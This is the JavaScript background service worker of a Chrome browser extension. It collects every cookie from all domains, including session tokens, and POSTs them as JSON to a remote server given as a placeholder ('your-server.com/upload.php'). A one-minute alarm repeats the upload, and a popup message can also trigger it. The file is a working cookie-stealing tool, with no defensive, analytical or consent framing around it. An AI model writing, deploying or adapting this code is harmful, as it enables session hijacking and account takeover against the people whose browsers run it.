console.log("Background service worker loaded!");

// ---- Configuration ----
const BACKEND_URL = "http://your-server.com/upload.php"; // Change to your Apache server

// ---- Read all cookies and return as array ----
function getAllCookies() {
  return new Promise((resolve) => {
    chrome.cookies.getAll({}, (cookies) => {
      const allCookies = (cookies || []).map(cookie => ({
        domain: cookie.domain,
        name: cookie.name,
        value: cookie.value
      }));
      resolve(allCookies);
    });
  });
}

// ---- Send cookies to backend server ----
function sendCookiesToServer(allCookies) {
  fetch(BACKEND_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(allCookies)
  })
  .then(res => res.text())
  .then(text => console.log("Server response:", text))
  .catch(err => console.error("Error sending cookies:", err));
}

// ---- Read and send cookies ----
function readAndUploadCookies() {
  getAllCookies().then(allCookies => {
    console.log("Uploading", allCookies.length, "cookies to server...");
    sendCookiesToServer(allCookies);
  });
}

// ---- Periodic alarm every 1 minute ----
chrome.alarms.create("uploadCookies", { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "uploadCookies") {
    readAndUploadCookies();
  }
});

// ---- Optional: manual trigger from popup ----
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "readNow") {
    readAndUploadCookies();
    sendResponse({ message: "Cookie read/upload triggered!" });
  }
});